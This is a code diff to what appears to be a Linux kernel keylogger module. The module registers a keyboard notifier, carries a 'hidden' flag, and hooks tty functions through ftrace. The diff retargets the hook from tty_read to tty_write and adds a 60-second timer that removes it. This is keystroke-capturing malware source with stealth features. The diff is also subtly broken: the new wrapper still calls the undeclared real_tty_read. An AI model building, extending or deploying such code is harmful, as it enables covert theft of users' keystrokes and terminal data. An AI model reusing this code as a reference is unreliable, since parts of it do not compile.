@@ -64,6 +64,8 @@ static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *
 
 static struct kobject *testhold;
 
+static struct timer_list ftrace_timer;
+
 static int major;
 static int is_open = 0;
 static int hidden = 0;
@@ -186,15 +188,15 @@ void remove_hooks(struct ftrace_hook *hooks, size_t count) {
 		remove_hook(&hooks[i]);
 }
 
-static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf, 
+static asmlinkage ssize_t (*real_tty_write)(struct file *file, char __user *buf, 
 		size_t count, loff_t *ppos);
 
-static asmlinkage ssize_t *ftrace_tty_read(struct file *file, char __user *buf,
+static asmlinkage ssize_t ftrace_tty_write(struct file *file, char __user *buf,
 		size_t count, loff_t *ppos) {
 
 	ssize_t ret;
 	
-	pr_info("test data: %s\n", buf);
+	pr_info("here we are again on our own\n");
 	ret = real_tty_read(file, buf, count, ppos);
 
 	return ret;
@@ -209,7 +211,7 @@ static asmlinkage ssize_t *ftrace_tty_read(struct file *file, char __user *buf,
 	}
 
 static struct ftrace_hook tty_hooks[] = {
-	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
+	HOOK("tty_write", ftrace_tty_write, &real_tty_write)
 };
 
 
@@ -387,6 +389,11 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
     return NOTIFY_OK;
 }
 
+static void kill_ftrace(unsigned long data) {
+	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
+	return;
+}
+
 static int __init init_klog(void) {
 	keybuf[0] = '\0';
 	hidden = 0;
@@ -400,9 +407,14 @@ static int __init init_klog(void) {
 	printk(KERN_INFO "major: %d\n", major);
 	printk(KERN_INFO "module name: %s\n", THIS_MODULE->name);
 
-    err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
+    setup_timer(&ftrace_timer, kill_ftrace, 0);
+	mod_timer(&ftrace_timer, jiffies + msecs_to_jiffies(60000));
+	
+	err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
 	if(err)
-		return err;	
+		return err;
+
+	pr_info("hook installed");	
 	
 	return 0;
 }
